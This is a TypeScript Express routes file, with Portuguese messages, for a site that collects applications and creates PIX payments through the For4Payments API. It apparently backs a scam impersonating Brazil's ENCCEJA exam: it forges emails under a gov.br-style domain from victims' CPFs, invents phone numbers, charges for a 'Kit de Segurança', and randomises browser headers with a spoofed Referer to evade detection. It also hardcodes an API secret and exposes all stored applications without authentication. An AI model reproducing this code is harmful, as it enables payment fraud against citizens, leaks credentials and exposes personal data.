import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertApplicationSchema } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Submit application
  app.post("/api/applications", async (req, res) => {
    try {
      const validatedData = insertApplicationSchema.parse(req.body);
      const application = await storage.createApplication(validatedData);
      res.json({ success: true, application });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: "Dados inválidos", details: error.errors });
      } else {
        res.status(500).json({ error: "Erro interno do servidor" });
      }
    }
  });

  // Get all applications (for admin purposes)
  app.get("/api/applications", async (req, res) => {
    try {
      const applications = await storage.getAllApplications();
      res.json(applications);
    } catch (error) {
      res.status(500).json({ error: "Erro interno do servidor" });
    }
  });

  // For4Payments API integration based on provided script
  function generateRandomEmail(name: string): string {
    const cleanName = name.toLowerCase().replace(/[^a-z0-9]/g, '');
    const randomNum = Math.floor(1000 + Math.random() * 9000);
    const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    const domain = domains[Math.floor(Math.random() * domains.length)];
    return `${cleanName}${randomNum}@${domain}`;
  }

  function generateRandomPhone(): string {
    const ddd = Math.floor(11 + Math.random() * 89);
    const number = Math.floor(900000000 + Math.random() * 100000000);
    return `${ddd}${number}`;
  }

  app.post("/api/create-pix-payment", async (req, res) => {
    try {
      const { name, cpf, amount } = req.body;
      
      // Validation exactly like the Python script
      const requiredFields = ['name', 'cpf', 'amount'];
      const missingFields = [];
      
      if (!name) missingFields.push('name');
      if (!cpf) missingFields.push('cpf');
      if (!amount) missingFields.push('amount');
      
      if (missingFields.length > 0) {
        return res.status(400).json({ 
          error: `Campos obrigatórios ausentes: ${missingFields.join(', ')}` 
        });
      }

      // Convert amount to cents exactly like Python script
      let amountInCents;
      try {
        amountInCents = Math.round(parseFloat(amount) * 100);
        console.log(`Valor do pagamento: R$ ${parseFloat(amount).toFixed(2)} (${amountInCents} centavos)`);
      } catch (error) {
        return res.status(400).json({ error: `Valor de pagamento inválido: ${amount}` });
      }
      
      if (amountInCents <= 0) {
        return res.status(400).json({ error: "Valor do pagamento deve ser maior que zero" });
      }

      // Process CPF exactly like Python script
      const cpfClean = cpf.replace(/\D/g, '');
      if (cpfClean.length !== 11) {
        return res.status(400).json({ error: "CPF inválido - deve conter 11 dígitos" });
      }
      
      console.log(`CPF validado: ${cpfClean.slice(0,3)}...${cpfClean.slice(-2)}`);

      // Generate email based on CPF like Python script
      const email = `${cpfClean}@participante.encceja.gov.br`;
      console.log(`Email gerado baseado no CPF: ${email}`);

      // Generate phone
      const phone = generateRandomPhone();
      console.log(`Telefone gerado automaticamente: ${phone}`);

      // Prepare payment data exactly like Python script
      const paymentData = {
        name: name,
        email: email,
        cpf: cpfClean,
        phone: phone,
        paymentMethod: "PIX",
        amount: amountInCents,
        items: [{
          title: "Kit de Segurança",
          quantity: 1,
          unitPrice: amountInCents,
          tangible: false
        }]
      };

      console.log('Dados de pagamento formatados:', paymentData);
      console.log('Endpoint API: https://app.for4payments.com.br/api/v1/transaction.purchase');
      console.log('Enviando requisição para API For4Payments...');

      // Generate random headers like Python script
      const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/94.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
      ];

      const languages = [
        "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7",
        "es-ES,es;q=0.9,pt;q=0.8,en;q=0.7"
      ];

      const secretKey = "8b780bca-10c8-48ed-9f9e-2895c71a7430";
      
      // Headers exactly like Python script
      const headers = {
        'Authorization': secretKey,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Accept-Language': languages[Math.floor(Math.random() * languages.length)],
        'Cache-Control': Math.random() > 0.5 ? 'max-age=0' : 'no-cache',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Cache-Buster': Date.now().toString(),
        'Referer': 'https://encceja2025.com.br/pagamento',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty'
      };

      console.log('Usando headers aleatórios para For4Payments API');

      // Make request exactly like Python script
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 30000);

      const response = await fetch('https://app.for4payments.com.br/api/v1/transaction.purchase', {
        method: 'POST',
        headers: headers,
        body: JSON.stringify(paymentData),
        signal: controller.signal
      });

      clearTimeout(timeoutId);

      console.log(`Resposta recebida (Status: ${response.status})`);
      
      if (response.status === 200) {
        const responseData = await response.json();
        console.log('Resposta da API:', responseData);

        // Extract PIX data exactly like Python script
        const pixCode = responseData.pixCode || 
                       responseData.copy_paste || 
                       responseData.code || 
                       responseData.pix_code ||
                       (responseData.pix && responseData.pix.code) ||
                       (responseData.pix && responseData.pix.copy_paste);

        const pixQrCode = responseData.pixQrCode || 
                         responseData.qr_code_image || 
                         responseData.qr_code || 
                         responseData.pix_qr_code ||
                         (responseData.pix && responseData.pix.qrCode) ||
                         (responseData.pix && responseData.pix.qr_code_image);

        // Format result exactly like Python script
        const result = {
          id: responseData.id || responseData.transactionId,
          pixCode: pixCode,
          pixQrCode: pixQrCode,
          expiresAt: responseData.expiresAt || responseData.expiration,
          status: responseData.status || 'pending',
          amount: parseFloat(amount),
          campaign: {
            name: 'CVC Anuidade For4Payments',
            paymentTitle: `Anuidade CVC via For4Payments - R$ ${amount}`
          }
        };

        console.log('Resposta mapeada para o formato padrão:', result);
        res.json(result);

      } else if (response.status === 401) {
        console.error('Erro de autenticação com a API For4Payments');
        res.status(401).json({ error: "Falha na autenticação com a API For4Payments. Verifique a chave de API." });
      } else {
        let errorMessage = 'Erro ao processar pagamento';
        try {
          const errorData = await response.json();
          if (errorData && typeof errorData === 'object') {
            errorMessage = errorData.message || errorData.error || errorMessage;
          }
        } catch (e) {
          errorMessage = `Erro ao processar pagamento (Status: ${response.status})`;
        }
        console.error(`Erro da API For4Payments: ${errorMessage}`);
        res.status(500).json({ error: errorMessage });
      }

    } catch (error: any) {
      if (error.name === 'TypeError' && error.message.includes('fetch')) {
        console.error('Erro de conexão com a API For4Payments:', error.message);
        res.status(500).json({ error: "Erro de conexão com o serviço de pagamento. Tente novamente em alguns instantes." });
      } else {
        console.error('Erro inesperado ao processar pagamento:', error.message);
        res.status(500).json({ error: "Erro interno ao processar pagamento. Por favor, tente novamente." });
      }
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
